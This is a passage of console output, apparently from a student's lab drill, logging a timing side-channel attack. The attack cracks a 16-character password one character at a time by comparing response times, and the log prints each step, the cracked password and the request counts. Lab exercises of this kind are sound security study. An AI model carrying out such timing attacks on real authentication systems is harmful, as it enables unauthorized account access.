# 17:20:38 | INFO     | Position 2: tested 21 letters (early_stop=YES), estimated_step=0.248630s, threshold_used=0.161223s, letter_time=0.282 min (16.93s), total_elapsed=0.570 min (34.20s)

#   Top candidates for position 2:
#   Top candidates for position 2:
#     1. 'u': 1.039962s (Δ +0.000000s) ◄ SELECTED
#     2. 'q': 0.797969s (Δ -0.241993s)
#     3. 'o': 0.796659s (Δ -0.243303s)
#     4. 'f': 0.796527s (Δ -0.243434s)
#     5. 'e': 0.794339s (Δ -0.245622s)
# 17:20:38 | INFO     | ✓ Password progress: 'wu' (2/16)

# 17:20:38 | INFO     | Testing position 3/16...
# 17:20:52 | INFO     | Position 3: tested 13 letters (early_stop=YES), estimated_step=0.240188s, threshold_used=0.204839s, letter_time=0.232 min (13.94s), total_elapsed=0.802 min (48.14s)

#   Top candidates for position 3:
#     1. 'm': 1.281967s (Δ +0.000000s) ◄ SELECTED
#     2. 'h': 1.133718s (Δ -0.148249s)
#     3. 'e': 1.086882s (Δ -0.195084s)
#     4. 'g': 1.045273s (Δ -0.236694s)
#     5. 'f': 1.040371s (Δ -0.241595s)
# 17:20:52 | INFO     | ✓ Password progress: 'wum' (3/16)

# 17:20:52 | INFO     | Testing position 4/16...
# 17:21:11 | INFO     | Position 4: tested 15 letters (early_stop=YES), estimated_step=0.242865s, threshold_used=0.185599s, letter_time=0.327 min (19.63s), total_elapsed=1.129 min (67.77s)

#   Top candidates for position 4:
#     1. 'o': 1.532550s (Δ +0.000000s) ◄ SELECTED
#     2. 'd': 1.294288s (Δ -0.238262s)
#     3. 'a': 1.291099s (Δ -0.241451s)
#     4. 'j': 1.289981s (Δ -0.242569s)
#     5. 'e': 1.288353s (Δ -0.244197s)
# 17:21:11 | INFO     | ✓ Password progress: 'wumo' (4/16)

# 17:21:11 | INFO     | Testing position 5/16...
# 17:21:29 | INFO     | Position 5: tested 11 letters (early_stop=YES), estimated_step=0.243047s, threshold_used=0.212834s, letter_time=0.287 min (17.20s), total_elapsed=1.416 min (84.97s)

#   Top candidates for position 5:
#     1. 'd': 1.780387s (Δ +0.000000s) ◄ SELECTED
#     2. 'g': 1.546566s (Δ -0.233820s)
#     3. 'k': 1.544000s (Δ -0.236387s)
#     4. 'a': 1.539305s (Δ -0.241082s)
#     5. 'h': 1.539249s (Δ -0.241138s)
# 17:21:29 | INFO     | ✓ Password progress: 'wumod' (5/16)

# 17:21:29 | INFO     | Testing position 6/16...
# 17:22:12 | INFO     | Position 6: tested 24 letters (early_stop=YES), estimated_step=0.247004s, threshold_used=0.151755s, letter_time=0.720 min (43.20s), total_elapsed=2.136 min (128.18s)

#   Top candidates for position 6:
#     1. 'x': 2.036084s (Δ +0.000000s) ◄ SELECTED
#     2. 'p': 1.792801s (Δ -0.243282s)
#     3. 'j': 1.792179s (Δ -0.243904s)
#     4. 's': 1.789476s (Δ -0.246607s)
#     5. 'o': 1.789441s (Δ -0.246643s)
# 17:22:12 | INFO     | ✓ Password progress: 'wumodx' (6/16)

# 17:22:12 | INFO     | Testing position 7/16...
# 17:23:01 | INFO     | Position 7: tested 24 letters (early_stop=YES), estimated_step=0.243660s, threshold_used=0.148203s, letter_time=0.820 min (49.23s), total_elapsed=2.957 min (177.41s)

#   Top candidates for position 7:
#     1. 'x': 2.276599s (Δ +0.000000s) ◄ SELECTED
#     2. 'l': 2.049951s (Δ -0.226648s)
#     3. 'q': 2.044005s (Δ -0.232594s)
#     4. 'k': 2.042951s (Δ -0.233648s)
#     5. 'o': 2.042238s (Δ -0.234361s)
# 17:23:01 | INFO     | ✓ Password progress: 'wumodxx' (7/16)

# 17:23:01 | INFO     | Testing position 8/16...
# 17:23:26 | INFO     | Position 8: tested 11 letters (early_stop=YES), estimated_step=0.245852s, threshold_used=0.216837s, letter_time=0.424 min (25.46s), total_elapsed=3.381 min (202.87s)

#   Top candidates for position 8:
#     1. 'i': 2.534194s (Δ +0.000000s) ◄ SELECTED
#     2. 'k': 2.293828s (Δ -0.240366s)
#     3. 'e': 2.293521s (Δ -0.240673s)
#     4. 'h': 2.287497s (Δ -0.246697s)
#     5. 'c': 2.287250s (Δ -0.246943s)
# 17:23:26 | INFO     | ✓ Password progress: 'wumodxxi' (8/16)

# 17:23:26 | INFO     | Testing position 9/16...
# 17:23:55 | INFO     | Position 9: tested 11 letters (early_stop=YES), estimated_step=0.251045s, threshold_used=0.224047s, letter_time=0.470 min (28.19s), total_elapsed=3.851 min (231.06s)

#   Top candidates for position 9:
#     1. 'i': 2.790438s (Δ +0.000000s) ◄ SELECTED
#     2. 'a': 2.543803s (Δ -0.246635s)
#     3. 'g': 2.539357s (Δ -0.251081s)
#     4. 'k': 2.536608s (Δ -0.253830s)
#     5. 'j': 2.535537s (Δ -0.254901s)
# 17:23:55 | INFO     | ✓ Password progress: 'wumodxxii' (9/16)

# 17:23:55 | INFO     | Testing position 10/16...
# 17:24:26 | INFO     | Position 10: tested 11 letters (early_stop=YES), estimated_step=0.248307s, threshold_used=0.214812s, letter_time=0.516 min (30.94s), total_elapsed=4.367 min (262.01s)

#   Top candidates for position 10:
#     1. 'k': 3.031357s (Δ +0.000000s) ◄ SELECTED
#     2. 'b': 2.795247s (Δ -0.236110s)
#     3. 'c': 2.790699s (Δ -0.240658s)
#     4. 'd': 2.789029s (Δ -0.242328s)
#     5. 'e': 2.787817s (Δ -0.243540s)
# 17:24:26 | INFO     | ✓ Password progress: 'wumodxxiik' (10/16)

# 17:24:26 | INFO     | Testing position 11/16...
# 17:25:33 | INFO     | Position 11: tested 22 letters (early_stop=YES), estimated_step=0.247831s, threshold_used=0.156212s, letter_time=1.118 min (67.10s), total_elapsed=5.485 min (329.11s)

#   Top candidates for position 11:
#     1. 'v': 3.280679s (Δ +0.000000s) ◄ SELECTED
#     2. 'i': 3.044075s (Δ -0.236603s)
#     3. 's': 3.040784s (Δ -0.239895s)
#     4. 'h': 3.040384s (Δ -0.240295s)
#     5. 'f': 3.038427s (Δ -0.242252s)
# 17:25:33 | INFO     | ✓ Password progress: 'wumodxxiikv' (11/16)

# 17:25:33 | INFO     | Testing position 12/16...
# 17:26:16 | INFO     | Position 12: tested 13 letters (early_stop=YES), estimated_step=0.243108s, threshold_used=0.193023s, letter_time=0.716 min (42.98s), total_elapsed=6.202 min (372.10s)

#   Top candidates for position 12:
#     1. 'm': 3.521454s (Δ +0.000000s) ◄ SELECTED
#     2. 'h': 3.289702s (Δ -0.231752s)
#     3. 'i': 3.289277s (Δ -0.232177s)
#     4. 'l': 3.289192s (Δ -0.232262s)
#     5. 'k': 3.286441s (Δ -0.235013s)
# 17:26:16 | INFO     | ✓ Password progress: 'wumodxxiikvm' (12/16)

# 17:26:16 | INFO     | Testing position 13/16...
# 17:27:34 | INFO     | Position 13: tested 22 letters (early_stop=YES), estimated_step=0.244690s, threshold_used=0.155340s, letter_time=1.300 min (77.99s), total_elapsed=7.501 min (450.09s)

#   Top candidates for position 13:
#     1. 'v': 3.776292s (Δ +0.000000s) ◄ SELECTED
#     2. 'i': 3.536728s (Δ -0.239563s)
#     3. 'p': 3.535796s (Δ -0.240496s)
#     4. 'q': 3.535625s (Δ -0.240666s)
#     5. 'n': 3.535561s (Δ -0.240731s)
# 17:27:34 | INFO     | ✓ Password progress: 'wumodxxiikvmv' (13/16)

# 17:27:34 | INFO     | Testing position 14/16...
# 17:28:16 | INFO     | Position 14: tested 11 letters (early_stop=YES), estimated_step=0.246510s, threshold_used=0.216835s, letter_time=0.697 min (41.83s), total_elapsed=8.199 min (491.92s)

#   Top candidates for position 14:
#     1. 'b': 4.024097s (Δ +0.000000s) ◄ SELECTED
#     2. 'e': 3.780660s (Δ -0.243437s)
#     3. 'g': 3.778174s (Δ -0.245923s)
#     4. 'c': 3.776374s (Δ -0.247724s)
#     5. 'k': 3.776370s (Δ -0.247727s)
# 17:28:16 | INFO     | ✓ Password progress: 'wumodxxiikvmvb' (14/16)

# 17:28:16 | INFO     | Testing position 15/16...
# 17:29:57 | INFO     | Position 15: tested 25 letters (early_stop=YES), estimated_step=0.246212s, threshold_used=0.147906s, letter_time=1.684 min (101.06s), total_elapsed=9.883 min (592.98s)

#   Top candidates for position 15:
#     1. 'y': 4.272406s (Δ +0.000000s) ◄ SELECTED
#     2. 'v': 4.036007s (Δ -0.236400s)
#     3. 'c': 4.035088s (Δ -0.237319s)
#     4. 'q': 4.032777s (Δ -0.239630s)
#     5. 's': 4.032127s (Δ -0.240280s)
# 17:29:57 | INFO     | ✓ Password progress: 'wumodxxiikvmvby' (15/16)

# --------------------------------------------------------------------------------
#   PHASE 3: Last Character Verification (Position 16)
# --------------------------------------------------------------------------------
# 17:30:01 | INFO     | ✓ Found correct last character: 'z'
# ================================================================================
#   ATTACK COMPLETE
# ================================================================================
#   ✓ CRACKED PASSWORD: 'wumodxxiikvmvbyz'
#   ⏱ Total Time: 9.958 min (597.50s)
#   📊 Total Requests: 1182
#   ⚡ Avg Time per Request: 0.5055s
# ================================================================================
# c:\Users\dorfe\OneDrive\Desktop\Projects_2025\Milumentor\Masters\Atacks\Atcks Drill 1\Timing_Side_Channel_Attack.py:597: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
#   "ts": datetime.utcnow().isoformat() + "Z",

# --------------------------------------------------------------------------------
#   FINAL VERIFICATION
# --------------------------------------------------------------------------------
# 17:30:05 | INFO     | Password verification: ✓ CORRECT
# 17:30:05 | INFO     | Run complete. Detailed run log: logs\attack_run_2025-11-11T15-20-04+00-00.log